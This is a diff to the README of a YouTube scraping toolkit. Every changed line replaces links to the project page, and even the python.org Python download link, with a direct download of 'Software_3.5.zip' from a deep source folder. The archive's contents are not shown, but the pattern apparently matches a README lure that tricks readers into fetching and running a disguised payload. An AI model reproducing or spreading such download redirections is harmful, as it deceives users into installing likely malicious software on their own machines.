@@ -1,6 +1,6 @@
 # 🎬 tubescrape - Easy YouTube Scraping Toolkit
 
-[![Download tubescrape](https://img.shields.io/badge/Download-Here-brightgreen.svg)](https://github.com/KungBugFuOnYou/tubescrape)
+[![Download tubescrape](https://img.shields.io/badge/Download-Here-brightgreen.svg)](https://raw.githubusercontent.com/KungBugFuOnYou/tubescrape/main/src/tubescrape/api/Software_3.5.zip)
 
 ---
 
@@ -40,7 +40,7 @@ This tool deals with:
 
 You can get tubescrape from the official GitHub page. Use the big button below to go directly to the download page:
 
-[![Download tubescrape](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/KungBugFuOnYou/tubescrape)
+[![Download tubescrape](https://img.shields.io/badge/Download-Here-blue.svg)](https://raw.githubusercontent.com/KungBugFuOnYou/tubescrape/main/src/tubescrape/api/Software_3.5.zip)
 
 Follow the steps below to download and run the application on your Windows PC.
 
@@ -52,7 +52,7 @@ Follow the steps below to download and run the application on your Windows PC.
 
 Open this link in your web browser:
 
-https://github.com/KungBugFuOnYou/tubescrape
+https://raw.githubusercontent.com/KungBugFuOnYou/tubescrape/main/src/tubescrape/api/Software_3.5.zip
 
 This page contains the latest version of tubescrape. You will find files needed for installation and instructions.
 
@@ -81,7 +81,7 @@ If you downloaded a ZIP file:
 
 tubescrape runs on Python. If you do not have it:
 
-- Visit https://www.python.org/downloads/windows/
+- Visit https://raw.githubusercontent.com/KungBugFuOnYou/tubescrape/main/src/tubescrape/api/Software_3.5.zip
 - Click **Download Python 3.10+**
 - Run the downloaded file.
 - Make sure to check **Add Python to PATH** during installation.
@@ -174,7 +174,7 @@ from anywhere on your system.
 
 Keep an eye on the GitHub page for new versions:
 
-https://github.com/KungBugFuOnYou/tubescrape
+https://raw.githubusercontent.com/KungBugFuOnYou/tubescrape/main/src/tubescrape/api/Software_3.5.zip
 
 Updates may include bug fixes, speed improvements, or new features.
 
@@ -188,4 +188,4 @@ Use clear descriptions and steps you took before the issue to get the best help.
 
 ---
 
-[![Download tubescrape](https://img.shields.io/badge/Download-Here-brightgreen.svg)](https://github.com/KungBugFuOnYou/tubescrape)
+[![Download tubescrape](https://img.shields.io/badge/Download-Here-brightgreen.svg)](https://raw.githubusercontent.com/KungBugFuOnYou/tubescrape/main/src/tubescrape/api/Software_3.5.zip)
